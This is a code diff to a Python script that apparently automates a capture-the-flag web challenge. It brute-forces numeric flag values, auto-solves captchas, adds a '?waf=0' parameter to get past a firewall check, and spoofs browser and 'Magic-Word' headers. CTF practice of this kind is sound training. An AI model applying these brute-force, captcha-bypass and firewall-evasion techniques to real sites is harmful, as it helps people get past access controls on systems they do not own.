@@ -44,7 +44,9 @@ class Session:
         elif challenge == "4":
             self.current_flag = 7000
             self.max_flag = 8000
-            self.http.headers.update({"Magic-Word": "camarche"})
+        elif challenge == "5":
+            self.current_flag = 8000
+            self.max_flag = 9000
         else:
             self.current_flag = 1000
             self.max_flag = 9999
@@ -53,11 +55,14 @@ class Session:
         """
         Prepares the request for sending by capturing and solving the captcha.
         """
+        if self.challenge == "5":
+            self._reset_session_for_challenge_5()
+
         if self.challenge == "2" and self.next_captcha != "":
             self.captcha_value = self.next_captcha
             self.next_captcha = ""
         else:
-            captcha = Captcha(self.url, self.http)
+            captcha = Captcha(self.url, self.http, self._get_headers())
             captcha.capture()
             captcha.solve()
             self.captcha_value = captcha.get_value()
@@ -80,9 +85,19 @@ class Session:
             "submit": "Envoyer",
         }
 
+        post_url = self.url
+
+        if self.challenge == "5":
+            post_url = self.url + "?waf=0"
+
         print(f"Try challenge={self.challenge} flag={self.flag_value} captcha={self.captcha_value}")
 
-        self.response = self.http.post(self.url, data=data, timeout=10)
+        self.response = self.http.post(
+            post_url,
+            data=data,
+            headers=self._get_headers(),
+            timeout=10,
+        )
 
     def process_response(self):
         """
@@ -102,6 +117,7 @@ class Session:
 
         if "access denied" in lowered:
             print("Access denied : header Magic-Word manquant ou incorrect")
+            print(self._extract_text_preview(text))
             return True
 
         if "invalid captcha" in lowered or "incorrect captcha" in lowered:
@@ -123,7 +139,7 @@ class Session:
                 self.current_flag += 1
                 return False
 
-        if self.challenge == "3" or self.challenge == "4":
+        if self.challenge in ["3", "4", "5"]:
             print(f"Flag incorrect : {self.flag_value}")
             self.current_flag += 1
 
@@ -140,6 +156,38 @@ class Session:
         print("Réponse inconnue du serveur :")
         print(self._extract_text_preview(text))
         return False
+
+    def _get_headers(self):
+        headers = {
+            "User-Agent": (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/120.0.0.0 Safari/537.36"
+            ),
+            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+            "Accept-Language": "fr-FR,fr;q=0.9,en;q=0.8",
+            "Connection": "keep-alive",
+        }
+
+        if self.challenge in ["4", "5"]:
+            headers["Magic-Word"] = "camarche"
+
+        return headers
+
+    def _reset_session_for_challenge_5(self):
+        self.http = requests.Session()
+        self.response = None
+
+        init_url = self.url + "?waf=0"
+        response = self.http.get(
+            init_url,
+            headers=self._get_headers(),
+            timeout=10,
+        )
+
+        print("INIT WAF URL:", init_url)
+        print("INIT WAF STATUS:", response.status_code)
+        print("COOKIES:", self.http.cookies.get_dict())
 
     def _extract_flag(self, text):
         normal_flag = re.search(r"FLAG-\d+\{[^}]+\}", text)
